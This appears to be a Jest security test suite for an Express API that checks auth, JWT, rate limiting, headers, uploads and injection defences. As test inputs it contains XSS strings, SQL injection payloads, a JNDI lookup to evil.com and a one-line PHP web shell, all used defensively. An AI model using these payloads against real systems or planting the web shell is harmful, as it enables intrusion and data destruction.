import request from 'supertest';
import express from 'express';
import jwt from 'jsonwebtoken';
import bcrypt from 'bcryptjs';
import app from '@/server';
import { TestDatabase } from '../helpers/test-db';

// Mock dependencies for security testing
jest.mock('../../src/utils/logger', () => ({
  logger: {
    info: jest.fn(),
    warn: jest.fn(),
    error: jest.fn(),
    debug: jest.fn(),
  },
}));

describe('Authentication Security Tests', () => {
  let testDb: TestDatabase;
  let authToken: string;
  let userId: string;

  beforeAll(async () => {
    testDb = TestDatabase.getInstance();
    await testDb.initialize();
    await testDb.seedTestData();

    // Create test user for authentication tests
    const hashedPassword = await bcrypt.hash('testpassword123', 10);
    const result = await testDb.getDb().query(`
      INSERT INTO users (id, email, password_hash, role, created_at, updated_at)
      VALUES ($1, $2, $3, $4, NOW(), NOW())
      RETURNING id
    `, ['test-user-auth', 'auth@test.com', hashedPassword, 'admin']);

    userId = result.rows[0].id;

    // Generate auth token
    authToken = jwt.sign(
      { id: userId, email: 'auth@test.com', role: 'admin' },
      process.env.JWT_SECRET || 'test-secret',
      { expiresIn: '1h' }
    );
  });

  afterAll(async () => {
    await testDb.close();
  });

  describe('Authentication Middleware', () => {
    test('should reject requests without authentication', async () => {
      const response = await request(app)
        .get('/api/agents')
        .expect(401);

      expect(response.body).toMatchObject({
        success: false,
        error: {
          code: 'UNAUTHORIZED',
          message: expect.any(String),
        },
      });
    });

    test('should reject requests with invalid token', async () => {
      const response = await request(app)
        .get('/api/agents')
        .set('Authorization', 'Bearer invalid-token')
        .expect(401);

      expect(response.body.success).toBe(false);
      expect(response.body.error.code).toBe('UNAUTHORIZED');
    });

    test('should reject requests with expired token', async () => {
      const expiredToken = jwt.sign(
        { id: userId, email: 'auth@test.com' },
        process.env.JWT_SECRET || 'test-secret',
        { expiresIn: '-1h' }
      );

      const response = await request(app)
        .get('/api/agents')
        .set('Authorization', `Bearer ${expiredToken}`)
        .expect(401);

      expect(response.body.success).toBe(false);
      expect(response.body.error.code).toBe('UNAUTHORIZED');
    });

    test('should accept requests with valid token', async () => {
      const response = await request(app)
        .get('/api/agents')
        .set('Authorization', `Bearer ${authToken}`)
        .expect(200);

      expect(response.body.success).toBe(true);
    });

    test('should reject malformed authorization headers', async () => {
      const malformedHeaders = [
        'InvalidHeader',
        'Bearer',
        'Bearer invalid format extra',
        'Bearer' + 'a'.repeat(10000), // Extremely long token
      ];

      for (const header of malformedHeaders) {
        const response = await request(app)
          .get('/api/agents')
          .set('Authorization', header)
          .expect(401);

        expect(response.body.success).toBe(false);
      }
    });
  });

  describe('Authorization Tests', () => {
    test('should enforce role-based access control', async () => {
      // Create user with limited role
      const userToken = jwt.sign(
        { id: 'limited-user', email: 'limited@test.com', role: 'user' },
        process.env.JWT_SECRET || 'test-secret',
        { expiresIn: '1h' }
      );

      // Try to access admin-only endpoint (if it exists)
      const response = await request(app)
        .delete('/api/agents/some-id')
        .set('Authorization', `Bearer ${userToken}`)
        .expect([401, 403, 404]); // May be unauthorized, forbidden, or not found

      if (response.status === 403) {
        expect(response.body.error.code).toBe('FORBIDDEN');
      }
    });

    test('should allow admin users to access admin endpoints', async () => {
      const response = await request(app)
        .get('/api/agents')
        .set('Authorization', `Bearer ${authToken}`)
        .expect(200);

      expect(response.body.success).toBe(true);
    });
  });

  describe('Password Security', () => {
    test('should hash passwords with bcrypt', async () => {
      const plainPassword = 'testpassword123';
      const hashedPassword = await bcrypt.hash(plainPassword, 10);

      // Verify password is hashed
      expect(hashedPassword).not.toBe(plainPassword);
      expect(hashedPassword).toMatch(/^\$2[aby]\$\d+\$/); // bcrypt format

      // Verify password can be validated
      const isValid = await bcrypt.compare(plainPassword, hashedPassword);
      expect(isValid).toBe(true);

      // Verify wrong password is rejected
      const isInvalid = await bcrypt.compare('wrongpassword', hashedPassword);
      expect(isInvalid).toBe(false);
    });

    test('should use sufficient bcrypt rounds', async () => {
      const password = 'testpassword123';
      const hashedPassword = await bcrypt.hash(password, 12); // Higher rounds for better security

      expect(hashedPassword).toMatch(/^\$2[aby]\$12\$/); // 12 rounds
    });
  });

  describe('JWT Security', () => {
    test('should use strong signing algorithm', async () => {
      const token = jwt.sign(
        { id: userId },
        process.env.JWT_SECRET || 'test-secret',
        { algorithm: 'HS256' }
      );

      const decoded = jwt.decode(token, { complete: true });
      expect((decoded as any).header.alg).toBe('HS256');
    });

    test('should include proper token claims', async () => {
      const decoded = jwt.decode(authToken) as any;

      expect(decoded).toHaveProperty('id');
      expect(decoded).toHaveProperty('email');
      expect(decoded).toHaveProperty('role');
      expect(decoded).toHaveProperty('iat');
      expect(decoded).toHaveProperty('exp');
    });

    test('should set reasonable token expiration', async () => {
      const decoded = jwt.decode(authToken) as any;
      const expirationTime = decoded.exp * 1000; // Convert to milliseconds
      const currentTime = Date.now();
      const timeUntilExpiration = expirationTime - currentTime;

      // Token should expire in reasonable time (not too long, not too short)
      expect(timeUntilExpiration).toBeGreaterThan(0);
      expect(timeUntilExpiration).toBeLessThan(24 * 60 * 60 * 1000); // Less than 24 hours
    });
  });

  describe('Input Validation Security', () => {
    test('should sanitize user inputs', async () => {
      const maliciousInputs = [
        '<script>alert("xss")</script>',
        '"; DROP TABLE users; --',
        '${jndi:ldap://evil.com/a}',
        '{{7*7}}',
        '{{config}}',
      ];

      for (const maliciousInput of maliciousInputs) {
        const response = await request(app)
          .post('/api/agents')
          .set('Authorization', `Bearer ${authToken}`)
          .send({
            name: maliciousInput,
            type: 'general',
          });

        // Should either reject input or sanitize it
        expect([400, 401, 422, 500]).toContain(response.status);

        if (response.status === 400 || response.status === 422) {
          expect(response.body.error.code).toMatch(/VALIDATION_ERROR|BAD_REQUEST/);
        }
      }
    });

    test('should enforce input length limits', async () => {
      const longString = 'a'.repeat(10000); // Very long string

      const response = await request(app)
        .post('/api/agents')
        .set('Authorization', `Bearer ${authToken}`)
        .send({
          name: longString,
          type: 'general',
        });

      expect([400, 401, 413, 422]).toContain(response.status);
    });

    test('should validate required fields', async () => {
      const response = await request(app)
        .post('/api/agents')
        .set('Authorization', `Bearer ${authToken}`)
        .send({
          // Missing required fields
        });

      expect([400, 401, 422]).toContain(response.status);
    });
  });

  describe('Rate Limiting Security', () => {
    test('should limit authentication attempts', async () => {
      const failedAttempts = Array.from({ length: 10 }, () =>
        request(app)
          .post('/api/auth/login')
          .send({
            email: 'test@test.com',
            password: 'wrongpassword',
          })
      );

      const results = await Promise.all(failedAttempts);

      // At least some attempts should be rate limited
      const rateLimited = results.filter(r => r.status === 429);
      expect(rateLimited.length).toBeGreaterThan(0);
    });

    test('should limit API requests per IP', async () => {
      const requests = Array.from({ length: 20 }, () =>
        request(app)
          .get('/api/agents')
          .set('Authorization', `Bearer ${authToken}`)
      );

      const results = await Promise.all(requests);

      // Some requests should be rate limited
      const rateLimited = results.filter(r => r.status === 429);
      expect(rateLimited.length).toBeGreaterThan(0);
    });
  });

  describe('CSRF Protection', () => {
    test('should include CSRF protection headers', async () => {
      const response = await request(app)
        .get('/api/agents')
        .set('Authorization', `Bearer ${authToken}`);

      // Check for CSRF headers (if implemented)
      const csrfToken = response.headers['x-csrf-token'];
      if (csrfToken) {
        expect(csrfToken).toBeDefined();
        expect(csrfToken.length).toBeGreaterThan(0);
      }
    });

    test('should validate CSRF tokens for state-changing operations', async () => {
      const response = await request(app)
        .post('/api/agents')
        .set('Authorization', `Bearer ${authToken}`)
        .send({
          name: 'Test Agent',
          type: 'general',
        });

      // If CSRF protection is implemented, should validate token
      if (response.status === 403) {
        expect(response.body.error.code).toBe('FORBIDDEN');
      }
    });
  });

  describe('Security Headers', () => {
    test('should include security headers', async () => {
      const response = await request(app).get('/health').expect(200);

      // Check for important security headers
      expect(response.headers['x-content-type-options']).toBe('nosniff');
      expect(response.headers['x-frame-options']).toBeDefined();
      expect(response.headers['x-xss-protection']).toBeDefined();

      // HTTPS headers (if HTTPS is configured)
      if (process.env.NODE_ENV === 'production') {
        expect(response.headers['strict-transport-security']).toBeDefined();
      }
    });

    test('should prevent information disclosure in error messages', async () => {
      const response = await request(app)
        .get('/api/nonexistent-endpoint')
        .expect(404);

      expect(response.body.success).toBe(false);
      expect(response.body.error.code).toBe('NOT_FOUND');

      // Should not reveal internal details
      expect(response.body.error.message).not.toContain('Error:');
      expect(response.body.error.message).not.toContain('Exception:');
      expect(response.body.error.message).not.toContain('stack');
    });
  });

  describe('SQL Injection Protection', () => {
    test('should prevent SQL injection in parameters', async () => {
      const sqlInjectionPayloads = [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "'; SELECT * FROM users; --",
        "' UNION SELECT * FROM users --",
        "'; INSERT INTO users VALUES ('hacker', 'password'); --",
      ];

      for (const payload of sqlInjectionPayloads) {
        const response = await request(app)
          .get(`/api/agents/search?q=${encodeURIComponent(payload)}`)
          .set('Authorization', `Bearer ${authToken}`);

        // Should not cause database errors
        expect([200, 400, 401, 422]).toContain(response.status);

        if (response.status === 200) {
          // Should not return unexpected data
          expect(response.body.data).toBeDefined();
        }
      }
    });

    test('should use parameterized queries', async () => {
      // This is more of a code review test, but we can check behavior
      const maliciousInput = "'; DROP TABLE agents; --";

      const response = await request(app)
        .get(`/api/agents/search?q=${encodeURIComponent(maliciousInput)}`)
        .set('Authorization', `Bearer ${authToken}`);

      // Database should still be functional
      const healthCheck = await request(app).get('/health');
      expect(healthCheck.status).toBe(200);
      expect(healthCheck.body.database.connected).toBe(true);
    });
  });

  describe('Session Security', () => {
    test('should invalidate tokens on logout', async () => {
      // This assumes logout functionality exists
      const response = await request(app)
        .post('/api/auth/logout')
        .set('Authorization', `Bearer ${authToken}`)
        .send({});

      if (response.status === 200) {
        // Token should be invalidated (if implemented)
        const subsequentResponse = await request(app)
          .get('/api/agents')
          .set('Authorization', `Bearer ${authToken}`);

        expect([401, 403]).toContain(subsequentResponse.status);
      }
    });

    test('should prevent session fixation', async () => {
      // Test that session tokens are properly regenerated
      const loginResponse = await request(app)
        .post('/api/auth/login')
        .send({
          email: 'auth@test.com',
          password: 'testpassword123',
        });

      if (loginResponse.status === 200) {
        const newToken = loginResponse.body.data?.token;
        expect(newToken).toBeDefined();
        expect(newToken).not.toBe(authToken);
      }
    });
  });

  describe('File Upload Security', () => {
    test('should validate file types and sizes', async () => {
      const maliciousFiles = [
        { name: 'malware.exe', content: Buffer.from('fake executable') },
        { name: 'script.php', content: Buffer.from('<?php system($_GET["cmd"]); ?>') },
        { name: 'huge.txt', content: Buffer.alloc(100 * 1024 * 1024) }, // 100MB
      ];

      for (const file of maliciousFiles) {
        const response = await request(app)
          .post('/api/upload')
          .set('Authorization', `Bearer ${authToken}`)
          .attach('file', file.content, file.name);

        expect([400, 401, 413, 422]).toContain(response.status);
      }
    });

    test('should scan uploaded files for threats', async () => {
      const suspiciousContent = Buffer.from('<script>alert("xss")</script>');

      const response = await request(app)
        .post('/api/upload')
        .set('Authorization', `Bearer ${authToken}`)
        .attach('file', suspiciousContent, 'test.html');

      // Should reject or sanitize suspicious files
      expect([400, 401, 422]).toContain(response.status);
    });
  });
});